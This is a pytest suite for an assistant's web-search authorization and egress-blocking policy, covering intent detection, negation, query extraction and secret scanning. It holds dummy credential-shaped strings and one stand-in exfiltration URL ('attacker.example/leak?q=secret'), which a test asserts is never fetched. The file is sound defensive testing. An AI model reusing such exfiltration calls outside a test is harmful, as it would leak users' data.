"""Phase B2: web authorization + egress gate (ZOE_PHASE_A1_DESIGN.md §6, §17.4).

Test labels (mission rules):
- unit: pure policy logic (intent, negation, quoting, query extraction, scanning).
- stubbed-network: the real search/reader code runs, but the provider module
  (``duckduckgo_search``) and ``requests.get`` are replaced by recording stubs.
  No test here touches the real network.

All dummy secrets are assembled at runtime and are not real credentials.
"""

from __future__ import annotations

import sys
import types
from pathlib import Path

import pytest

from web import policy
from tools.result_envelope import ErrorType, ResultStatus
from web.policy import WebState, evaluate_web_request, web_turn

REPO = Path(__file__).resolve().parents[1]

# Dummy secrets (assembled so the source holds no contiguous token).
DUMMY_GITHUB = "gh" + "p_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
DUMMY_AWS = "AK" + "IA" + "ABCDEFGHIJKLMNOP"
DUMMY_OPENAI = "s" + "k-" + "abcdefghijklmnopqrstuvwxyz012345"
DUMMY_JWT = "ey" + "JhbGciOiJIUzI1NiJ9" + ".ey" + "JzdWIiOiIxMjM0NTY3ODkwIn0" + ".abcDEF123ghiJKL456"
DUMMY_KEY_BLOCK = "-----BEGIN " + "RSA PRIVATE KEY-----\nMIIBOgIBAAJBAK\n-----END RSA PRIVATE KEY-----"


# ---------------------------------------------------------------------------
# Stubs
# ---------------------------------------------------------------------------


class _Recorder:
    def __init__(self) -> None:
        self.queries: list[str] = []
        self.urls: list[str] = []
        self.results: list[dict[str, str]] = [
            {"title": "Result One", "href": "https://example.org/one", "body": "Snippet one"},
            {"title": "Result Two", "href": "https://example.org/two", "body": "Snippet two"},
        ]
        self.raise_exc: BaseException | None = None


class _FakeResponse:
    def __init__(self, url: str) -> None:
        self.status_code = 200
        self.is_redirect = False
        self.headers = {"Content-Type": "text/html; charset=utf-8"}
        self.encoding = "utf-8"
        self.apparent_encoding = "utf-8"
        self.content = f"<html><body><p>Page body for {url}</p></body></html>".encode()

    def raise_for_status(self) -> None:
        return None


@pytest.fixture
def net(monkeypatch: pytest.MonkeyPatch) -> _Recorder:
    """stubbed-network: record every provider query and page download."""
    rec = _Recorder()

    class FakeDDGS:
        def __init__(self, *args, **kwargs) -> None:
            pass

        def __enter__(self) -> "FakeDDGS":
            return self

        def __exit__(self, *exc) -> None:
            return None

        def text(self, query: str, max_results: int = 5, timelimit=None, backend: str = "auto"):
            rec.queries.append(query)
            if rec.raise_exc is not None:
                raise rec.raise_exc
            return list(rec.results)

    fake_module = types.ModuleType("duckduckgo_search")
    fake_module.DDGS = FakeDDGS
    monkeypatch.setitem(sys.modules, "duckduckgo_search", fake_module)

    def fake_get(url: str, **kwargs):
        rec.urls.append(url)
        return _FakeResponse(url)

    monkeypatch.setattr("web.reader.requests.get", fake_get)
    # Keep tests away from storage/web_cache.
    monkeypatch.setattr("web.retriever.get_cached_page", lambda url: None)
    monkeypatch.setattr("web.retriever.cache_page", lambda url, text: None)
    monkeypatch.setattr("web.retriever.get_cached_retrieved_at", lambda url: "2026-10-05T00:00:00")
    monkeypatch.delenv("ZOE_OFFLINE", raising=False)
    return rec


@pytest.fixture(autouse=True)
def _online_by_default(monkeypatch: pytest.MonkeyPatch):
    from tools import session_markers

    monkeypatch.delenv("ZOE_OFFLINE", raising=False)
    # Session markers are process-global; other test modules (e.g. B1
    # filesystem tests) may have recorded some. Start and end each test clean.
    session_markers.reset_session_markers()
    yield
    session_markers.reset_session_markers()


# ---------------------------------------------------------------------------
# unit: explicit intent
# ---------------------------------------------------------------------------

EXPLICIT_REQUESTS = [
    ("Search the web for the latest Python release.", "the latest Python release"),
    ("Search online for the official documentation.", "the official documentation"),
    ("Browse the web for current information about X.", "current information about X"),
    ("Check the internet for X.", "X"),
    ("Find current information about X online.", "current information about X"),
    ("Please search the web for X.", "X"),
    ("Can you search the web for rust 1.80 changes?", "rust 1.80 changes"),
    ('Search the web for "Python 3.13 release notes"', "Python 3.13 release notes"),
    ("Look up the FastAPI changelog online, please.", "the FastAPI changelog"),
    ("Use the web to find the population of Pune", "the population of Pune"),
    ("Google best pizza in Bangalore", "best pizza in Bangalore"),
    ("Explain decorators and then search the web for PEP 318 history.", "PEP 318 history"),
    ("I'm not sure, search the web for X", "X"),
]


@pytest.mark.parametrize(("message", "query"), EXPLICIT_REQUESTS)
def test_unit_explicit_requests_are_authorized_with_narrow_query(message: str, query: str) -> None:
    decision = evaluate_web_request(message)
    assert decision.error_type is None
    assert decision.explicit_intent
    assert decision.query == query


def test_unit_look_this_up_online_is_explicit_but_has_no_usable_query() -> None:
    decision = evaluate_web_request("Look this up online.")
    assert decision.explicit_intent
    assert decision.error_type is ErrorType.WEB_NOT_AUTHORIZED
    assert decision.diagnostic == policy.DIAG_QUERY_UNBUILDABLE
    assert not decision.allowed
    assert decision.query is None


NON_WEB_REQUESTS = [
    "What is the latest Python version?",
    "What is the current price?",
    "What is the release date?",
    "Compare these two products.",
    "What is the documentation for X?",
    "Find information about X.",
    "Tell me about X.",
    "What do you know about X?",
    "Explain X.",
    "Help me understand X.",
    "Write code for X.",
    "Read this file.",
    "Summarize this pdf and cite the source.",
    "What is today's news about the latest release version?",
    "Research the current documentation for pandas.",
]


@pytest.mark.parametrize("message", NON_WEB_REQUESTS)
def test_unit_keywords_and_time_sensitive_questions_never_authorize(message: str) -> None:
    decision = evaluate_web_request(message)
    assert decision.error_type is ErrorType.WEB_NOT_AUTHORIZED
    assert not decision.explicit_intent
    assert decision.query is None


QUOTED_OR_PASTED = [
    'Someone told me "search the web for X".\nWhat does that sentence mean?',
    "Someone told me 'search the web for X'. What does that mean?",
    "Here is some code:\n\n# search the web for secret-token-example",
    "```\nsearch the web for X\n```",
    "What does `search the web for X` do in this script?",
    "> search the web for X\nIs this a good instruction?",
    "Here is the log:\nsearch the web for X\nwhat happened?",
    "    search the web for X",
    "He said, search the web for X",
    "Someone told me to search the web for X",
    "How do I search the web for X?",
]


@pytest.mark.parametrize("message", QUOTED_OR_PASTED)
def test_unit_quoted_code_pasted_and_reported_instructions_do_not_authorize(message: str) -> None:
    assert evaluate_web_request(message).error_type is ErrorType.WEB_NOT_AUTHORIZED


NEGATED = [
    "Don't search the web.",
    "Do not browse online.",
    "I don't want you to search.",
    "Explain this without using the web.",
    "Search the web for X. Actually, don't use the internet.",
    "Don't search the web, just explain X.",
    "Never google anything for me. Search the web for X.",
    "No need to look it up online; tell me about X.",
]


@pytest.mark.parametrize("message", NEGATED)
def test_unit_negated_or_contradictory_web_wording_denies_whole_turn(message: str) -> None:
    decision = evaluate_web_request(message)
    assert decision.error_type is ErrorType.WEB_NOT_AUTHORIZED
    assert decision.reason == "negated"


def test_unit_explicit_request_is_not_confused_by_ordinary_not() -> None:
    decision = evaluate_web_request("Search the web for the not-found error in nginx")
    assert decision.error_type is None
    assert decision.query == "the not-found error in nginx"


# ---------------------------------------------------------------------------
# unit: query extraction
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "message",
    [
        "Search the web",
        "Search the web for this error",
        "Search the web for it",
        "Google it",
        "Search the web for:\n```\nTraceback (most recent call last)\n```",
        "Search the web for " + " ".join(["word"] * 40),
        "Search the web for " + "x" * 250,
    ],
)
def test_unit_no_usable_query_never_falls_back_to_message(message: str) -> None:
    decision = evaluate_web_request(message)
    assert decision.error_type is ErrorType.WEB_NOT_AUTHORIZED
    assert decision.diagnostic == policy.DIAG_QUERY_UNBUILDABLE
    assert decision.explicit_intent
    assert decision.query is None


def test_unit_query_is_never_the_whole_message_and_respects_limits() -> None:
    message = (
        "I have been working on a long project all week and I am tired. "
        "Anyway, my team asked lots of things about the system architecture we built. "
        "Search the web for asyncio TaskGroup cancellation semantics, then explain them to me "
        "in simple words with an example."
    )
    decision = evaluate_web_request(message)
    assert decision.error_type is None
    assert decision.query == "asyncio TaskGroup cancellation semantics"
    assert len(decision.query) <= policy.MAX_QUERY_CHARS
    assert len(decision.query.split()) <= policy.MAX_QUERY_WORDS
    assert "\n" not in decision.query
    assert decision.query != message


def test_unit_decision_holds_no_message_text() -> None:
    message = "Search the web for X. " + DUMMY_GITHUB
    decision = evaluate_web_request(message)
    assert DUMMY_GITHUB not in repr(decision)
    assert decision.query is None


# ---------------------------------------------------------------------------
# unit: sensitive content (secret-anywhere rule + query categories)
# ---------------------------------------------------------------------------

SECRET_MESSAGES = [
    ("Search the web for python asyncio. My key: " + DUMMY_GITHUB, "credential"),
    ("Search the web for boto3 errors. AWS id " + DUMMY_AWS, "credential"),
    ("Search the web for openai quota. key=" + DUMMY_OPENAI, "credential"),
    ("Search the web for jwt expiry. Authorization: Bearer " + DUMMY_JWT, "credential"),
    ("Search the web for this:\n" + DUMMY_KEY_BLOCK, "private_key"),
    ("Search the web for postgres errors from postgres://admin:hunter22@db.example.com/x", "credential"),
    ("Search the web for why my password is hunter22 rejected", "credential"),
    ('Search the web for azure blob. AccountKey=abcDEF123456ghiJKL==', "credential"),
    ("Search the web for flask config.\n```py\nAPI_KEY = 'q8Zr2LmP0xVb7Ty'\n```", "credential"),
    ("Search the web for token Zx9Qw8Er7Ty6Ui5Op4As3Df2Gh1Jk0Lm", "high_entropy_string"),
    (
        "Search the web for this output: [REDACTED: line contained a possible secret]",
        "redacted_content",
    ),
]


@pytest.mark.parametrize(("message", "category"), SECRET_MESSAGES)
def test_unit_secret_anywhere_blocks_whole_web_operation(message: str, category: str) -> None:
    decision = evaluate_web_request(message)
    assert decision.error_type is ErrorType.EGRESS_BLOCKED_SENSITIVE
    assert category in decision.categories
    assert decision.query is None
    notice = policy.blocked_notice(decision)
    for secret in (DUMMY_GITHUB, DUMMY_AWS, DUMMY_OPENAI, DUMMY_JWT, "hunter22", "MIIBOgIBAAJBAK"):
        assert secret not in notice
    assert "can't search the web" in notice


def test_unit_secret_outside_extracted_query_still_blocks() -> None:
    decision = evaluate_web_request(
        "Search the web for the latest Django release.\n\nAlso unrelated: " + DUMMY_GITHUB
    )
    assert decision.error_type is ErrorType.EGRESS_BLOCKED_SENSITIVE


@pytest.mark.parametrize(
    ("message", "category"),
    [
        ("Search the web for john.doe@example.com", "email_address"),
        ("Search the web for 415-555-0134 owner", "phone_number"),
        ("Search the web for 192.168.1.20 router login", "ip_address"),
        ("Search the web for /home/dak/project error", "local_path"),
        ("Search the web for C:\\Users\\Admin\\notes.txt", "local_path"),
        ("Search the web for build-server.internal status", "private_host"),
    ],
)
def test_unit_private_data_in_query_blocks(message: str, category: str) -> None:
    decision = evaluate_web_request(message)
    assert decision.error_type is ErrorType.EGRESS_BLOCKED_SENSITIVE
    assert category in decision.categories


def test_unit_code_that_merely_mentions_token_is_not_a_secret() -> None:
    decision = evaluate_web_request("Search the web for why token = tokenizer(text) is slow")
    assert decision.error_type is None


def test_unit_offline_mode_blocks_explicit_request(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("ZOE_OFFLINE", "1")
    decision = evaluate_web_request("Search the web for X")
    assert decision.error_type is ErrorType.NETWORK_UNAVAILABLE
    assert decision.diagnostic == policy.DIAG_OFFLINE
    assert not decision.allowed
    assert "offline" in policy.blocked_notice(decision).lower()


# ---------------------------------------------------------------------------
# stubbed-network: every entry path reaches the single gate
# ---------------------------------------------------------------------------

ASSESSMENT_STYLE_PROMPTS = [
    "What is the latest version of FastAPI?",
    "Compare React vs Vue for my project",
    "Summarize the pdf documentation and cite the source",
    "Research current exchange rate trends",
    "Fix this code:\n```python\napi_key = '" + DUMMY_OPENAI + "'\nclient = Client(api_key)\n```",
    "Here is my config: password=hunter22 token=" + DUMMY_GITHUB + " what is the latest release?",
]


def _all_entry_paths(prompt: str) -> None:
    from agents.executor import _run_tool
    from agents.specialists.research_agent import ResearchSpecialist
    from agents.state import AgentState
    from agents.tasks.task_executor import _dispatch_action
    from brain.context import _prepare_web_context
    from web.reader import read_webpage
    from web.retriever import retrieve_web_context, retrieve_web_context_with_stats
    from web.search import search_web

    _prepare_web_context(prompt)
    _run_tool("web", prompt, "", AgentState(conversation_id="t", goal=prompt))
    ResearchSpecialist().run(prompt, None)
    try:
        _dispatch_action("research_web", prompt)
    except (PermissionError, RuntimeError):
        pass
    retrieve_web_context(prompt)
    retrieve_web_context_with_stats(prompt)
    search_web(prompt)
    read_webpage("https://example.org/one")


@pytest.fixture
def no_local_indexes(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("pdf.retriever.search_documents", lambda *a, **k: [])
    monkeypatch.setattr("codebase.retriever.search_code", lambda *a, **k: [])


@pytest.mark.parametrize("prompt", ASSESSMENT_STYLE_PROMPTS)
def test_stubbed_non_web_turns_never_reach_network_on_any_path(
    prompt: str, net: _Recorder, no_local_indexes: None
) -> None:
    with web_turn(prompt):
        _all_entry_paths(prompt)
    assert net.queries == []
    assert net.urls == []


def test_stubbed_no_active_turn_means_no_network(net: _Recorder, no_local_indexes: None) -> None:
    _all_entry_paths("Search the web for X")
    assert net.queries == []
    assert net.urls == []


def test_stubbed_explicit_turn_sends_only_constructed_query_once(
    net: _Recorder, no_local_indexes: None
) -> None:
    prompt = "Please search the web for asyncio TaskGroup docs and explain them"
    with web_turn(prompt) as decision:
        assert decision.query == "asyncio TaskGroup docs"
        _all_entry_paths(prompt)  # every path passes the raw prompt; none of it is sent
        assert policy.current_web_state() == WebState(ResultStatus.SUCCESS)
    assert net.queries == ["asyncio TaskGroup docs"]
    assert prompt not in net.queries
    assert set(net.urls) <= {"https://example.org/one", "https://example.org/two"}
    assert len(net.urls) <= policy.MAX_PAGE_FETCHES


def test_stubbed_page_fetch_only_for_result_urls_and_within_budget(net: _Recorder) -> None:
    from web.reader import read_webpage
    from web.search import search_web

    net.results = [
        {"title": f"R{i}", "href": f"https://example.org/{i}", "body": "s"} for i in range(5)
    ]
    with web_turn("Search the web for X"):
        assert read_webpage("https://example.org/0") == ""  # before any search
        search_web("ignored caller text")
        assert read_webpage("https://attacker.example/leak?q=secret") == ""
        texts = [read_webpage(f"https://example.org/{i}") for i in range(5)]
    assert "https://attacker.example/leak?q=secret" not in net.urls
    assert sum(1 for t in texts if t) == policy.MAX_PAGE_FETCHES
    assert len(net.urls) == policy.MAX_PAGE_FETCHES


def test_stubbed_authorization_does_not_persist_to_next_turn(net: _Recorder) -> None:
    from web.search import search_web

    with web_turn("Search the web for X"):
        search_web("X")
    assert net.queries == ["X"]
    # After the turn ends nothing is authorized, even with no new turn.
    assert search_web("X") == []
    # A follow-up turn that is not explicit stays denied even though the
    # previous user message asked for the web.
    with web_turn("What about the latest version?"):
        assert search_web("X") == []
        assert policy.current_web_state() == WebState(ResultStatus.DENIED, ErrorType.WEB_NOT_AUTHORIZED)
    assert net.queries == ["X"]


def test_stubbed_offline_rechecked_at_call_time(net: _Recorder, monkeypatch: pytest.MonkeyPatch) -> None:
    from web.search import search_web

    with web_turn("Search the web for X") as decision:
        assert decision.allowed
        monkeypatch.setenv("ZOE_OFFLINE", "1")
        assert search_web("X") == []
        outcome = policy.gated_search()
        assert (outcome.status, outcome.error_type) == (ResultStatus.DENIED, ErrorType.NETWORK_UNAVAILABLE)
        assert outcome.detail == policy.DIAG_OFFLINE
    assert net.queries == []


def test_stubbed_blocked_sensitive_turn_makes_no_call(net: _Recorder, no_local_indexes: None) -> None:
    prompt = "Search the web for boto3 errors. AWS id " + DUMMY_AWS
    with web_turn(prompt) as decision:
        assert decision.error_type is ErrorType.EGRESS_BLOCKED_SENSITIVE
        _all_entry_paths(prompt)
    assert net.queries == []
    assert net.urls == []


# ---------------------------------------------------------------------------
# stubbed-network: typed failures, zero results, bounds
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("exc", "status", "error_type"),
    [
        (TimeoutError("slow"), ResultStatus.TIMEOUT, ErrorType.TIMEOUT),
        (ConnectionError("down"), ResultStatus.ERROR, ErrorType.NETWORK_UNAVAILABLE),
        (type("TimeoutException", (Exception,), {})("x"), ResultStatus.TIMEOUT, ErrorType.TIMEOUT),
        (
            type("DuckDuckGoSearchException", (Exception,), {})("impersonate"),
            ResultStatus.ERROR,
            ErrorType.NETWORK_UNAVAILABLE,
        ),
    ],
)
def test_stubbed_provider_failures_are_typed(
    net: _Recorder, exc: BaseException, status: ResultStatus, error_type: ErrorType
) -> None:
    net.raise_exc = exc
    with web_turn("Search the web for X"):
        outcome = policy.gated_search()
        assert outcome.status is status
        assert outcome.error_type is error_type
        assert not outcome.searched
        assert policy.web_outcome_notice() == policy.FALLBACK_COULD_NOT_SEARCH


def test_stubbed_dependency_missing(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setitem(sys.modules, "duckduckgo_search", None)
    with web_turn("Search the web for X"):
        outcome = policy.gated_search()
    assert (outcome.status, outcome.error_type) == (ResultStatus.ERROR, ErrorType.NETWORK_UNAVAILABLE)
    assert outcome.detail == policy.DIAG_PROVIDER_MISSING
    assert not outcome.searched


def test_stubbed_zero_results_is_distinct_from_failure(net: _Recorder) -> None:
    net.results = []
    with web_turn("Search the web for X"):
        outcome = policy.gated_search()
        assert (outcome.status, outcome.error_type) == (ResultStatus.ERROR, ErrorType.NO_RESULTS)
        assert outcome.searched
        assert "found no results" in policy.web_outcome_notice()
    assert net.queries == ["X"]


def test_stubbed_results_are_bounded_and_marked_untrusted(net: _Recorder) -> None:
    net.results = [
        {"title": "T" * 500, "href": f"https://example.org/{i}", "body": "S" * 900} for i in range(12)
    ]
    with web_turn("Search the web for X"):
        outcome = policy.gated_search(max_results=50)
    assert len(outcome.items) == policy.MAX_RESULTS
    assert all(len(i.title) <= policy.MAX_TITLE_CHARS for i in outcome.items)
    assert all(len(i.snippet) <= policy.MAX_SNIPPET_CHARS for i in outcome.items)
    assert [i.rank for i in outcome.items] == [1, 2, 3, 4, 5]
    assert outcome.items[0].source_domain == "example.org"
    assert outcome.trust == policy.UNTRUSTED_EXTERNAL
    assert outcome.retrieved_at


def test_stubbed_fetch_failed_when_no_page_readable(net: _Recorder, monkeypatch: pytest.MonkeyPatch) -> None:
    from web.retriever import retrieve_web_context_with_stats

    monkeypatch.setattr("web.reader.requests.get", lambda url, **k: (_ for _ in ()).throw(OSError("x")))
    with web_turn("Search the web for X"):
        context, stats = retrieve_web_context_with_stats("X")
        assert context == ""
        assert stats["status"] == "error"
        assert stats["error_type"] == "fetch_failed"
        assert "couldn't read any of the result pages" in policy.web_outcome_notice()


# ---------------------------------------------------------------------------
# stubbed-network: user-facing behavior through brain/pipeline + brain/context
# ---------------------------------------------------------------------------


@pytest.fixture
def pipeline_stubs(monkeypatch: pytest.MonkeyPatch, net: _Recorder):
    import brain.pipeline as pipeline

    calls: dict[str, list] = {"messages": []}

    def fake_generate(tokenizer, model, messages, max_new_tokens=256):
        calls["messages"].append(messages)
        return "MODEL ANSWER"

    monkeypatch.setattr(pipeline, "load_model", lambda: (None, None))
    monkeypatch.setattr(pipeline, "generate_text", fake_generate)
    monkeypatch.setattr(pipeline, "get_history", lambda max_messages=20: [])
    monkeypatch.setattr(pipeline, "_try_save_memory", lambda text: False)
    monkeypatch.setattr(pipeline, "_complete_turn", lambda prompt, reply: reply)
    monkeypatch.setattr(
        "memory.intelligence.memory_review.respond_to_profile_query", lambda prompt: None
    )
    monkeypatch.setattr("brain.context._merge_conversation_context", lambda q, c: c)

    def no_tool(prompt):
        raise AssertionError("explicit web turns must not fall through to other paths")

    monkeypatch.setattr(pipeline, "execute_tool", no_tool)
    return pipeline, calls, net


def test_stubbed_pipeline_success_discloses_query_and_real_sources(pipeline_stubs) -> None:
    pipeline, calls, net = pipeline_stubs
    reply = pipeline.generate_response("Search the web for asyncio TaskGroup docs")
    assert net.queries == ["asyncio TaskGroup docs"]
    assert reply.startswith("Searched the web for: `asyncio TaskGroup docs`")
    assert "https://example.org/one" in reply
    assert "untrusted external content" in reply
    system = calls["messages"][0][0]["content"]
    assert "untrusted external data" in system


def test_stubbed_pipeline_sensitive_block_is_deterministic(pipeline_stubs) -> None:
    pipeline, calls, net = pipeline_stubs
    reply = pipeline.generate_response("Search the web for this. token=" + DUMMY_GITHUB)
    assert net.queries == []
    assert calls["messages"] == []  # no model call, nothing searched
    assert DUMMY_GITHUB not in reply
    assert reply.startswith("I can't search the web from that message because it contains")


def test_stubbed_pipeline_no_usable_query_asks_user(pipeline_stubs) -> None:
    pipeline, calls, net = pipeline_stubs
    reply = pipeline.generate_response("Look this up online.")
    assert net.queries == []
    assert "What should I search for?" in reply


def test_stubbed_pipeline_offline_answers_locally_without_claiming_search(
    pipeline_stubs, monkeypatch: pytest.MonkeyPatch
) -> None:
    pipeline, calls, net = pipeline_stubs
    monkeypatch.setenv("ZOE_OFFLINE", "1")
    reply = pipeline.generate_response("Search the web for X")
    assert net.queries == []
    assert reply.startswith("Web access is off because offline mode is on")
    assert "Searched the web" not in reply
    assert "No web search results are available" in calls["messages"][0][0]["content"]


def test_stubbed_pipeline_failure_uses_honest_fallback(pipeline_stubs) -> None:
    pipeline, calls, net = pipeline_stubs
    net.raise_exc = ConnectionError("down")
    reply = pipeline.generate_response("Search the web for X")
    assert reply.startswith(policy.FALLBACK_COULD_NOT_SEARCH)
    assert "Sources" not in reply
    assert "No web search results are available" in calls["messages"][0][0]["content"]


def test_stubbed_keyword_web_route_without_intent_tells_model_no_search(net: _Recorder, monkeypatch) -> None:
    from brain.context import WEB_NOT_USED_INSTRUCTION, _build_chat_messages

    monkeypatch.setattr("brain.context._merge_conversation_context", lambda q, c: c)
    with web_turn("What is the latest Python version?"):
        messages = _build_chat_messages("What is the latest Python version?", [], selected_route="web")
    assert net.queries == []
    assert WEB_NOT_USED_INSTRUCTION in messages[0]["content"]


# ---------------------------------------------------------------------------
# unit: static proof that the gate is the only network entry
# ---------------------------------------------------------------------------

_SKIP_DIRS = {"tests", "scripts", "training", ".git", "storage", "data", "models", "node_modules"}


def _first_party_sources() -> list[Path]:
    files = []
    for path in REPO.rglob("*.py"):
        rel = path.relative_to(REPO)
        if rel.parts and (rel.parts[0] in _SKIP_DIRS or rel.parts[0].startswith(".")):
            continue
        if "site-packages" in rel.parts:
            continue
        files.append(path)
    return files


def test_unit_only_gated_modules_contain_network_clients() -> None:
    import re

    pattern = re.compile(
        r"duckduckgo_search|\bDDGS\b|requests\.(?:get|post|put|request|Session)|urlopen|"
        r"\bhttpx\b|\baiohttp\b|http\.client"
    )
    offenders = {
        str(p.relative_to(REPO))
        for p in _first_party_sources()
        if pattern.search(p.read_text(encoding="utf-8", errors="replace"))
    }
    # core/package_check.py only names the package for its install check.
    assert offenders <= {"web/search.py", "web/reader.py", "core/package_check.py"}


def test_unit_provider_search_is_called_only_by_the_gate() -> None:
    callers = {
        str(p.relative_to(REPO))
        for p in _first_party_sources()
        if "provider_search(" in p.read_text(encoding="utf-8", errors="replace")
    }
    assert callers == {"web/search.py", "web/policy.py"}


def test_unit_unsafe_permission_no_longer_implies_network() -> None:
    from plugins.permissions import Permission, has_permission

    granted = frozenset({Permission.UNSAFE.value})
    assert not has_permission(granted, Permission.INTERNET)
    assert not has_permission(granted, Permission.WEB)
    assert has_permission(granted, Permission.FILESYSTEM)
    assert has_permission(frozenset({Permission.INTERNET.value}), Permission.INTERNET)
